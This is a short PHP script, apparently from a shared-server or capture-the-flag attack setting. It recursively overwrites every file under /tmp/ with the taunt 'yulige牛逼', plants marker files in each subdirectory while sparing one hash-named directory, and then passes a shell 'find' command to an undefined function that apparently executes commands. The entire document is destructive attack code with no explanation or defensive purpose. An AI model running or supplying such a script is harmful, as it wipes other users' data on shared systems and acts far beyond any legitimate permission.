<?php

set_time_limit(0);
function all($dir) {
	if (!is_dir($dir)) {
		return false;
	}
	$handle = opendir($dir);
	if ($handle) {
		while (($fl = readdir($handle)) !== false) {
			$temp = $dir . DIRECTORY_SEPARATOR . $fl;
			if (is_dir($temp) && $fl != '.' && $fl != '..'
				&& $fl != '/tmp/8587c01da3ade7f025ac10068e806417/'
				&& $fl != '/tmp/8587c01da3ade7f025ac10068e806417') {
				all($temp);
				file_put_contents($temp . "/yulige牛逼", "yulige牛逼");
			} else {
				if ($fl != '.' && $fl != '..') {
					file_put_contents($temp, "yulige牛逼....yulige牛逼");
				}
			}
		}
	}
}

all('/tmp/');

echo dalaodaidaiwo("find /tmp/ | grep yulige");
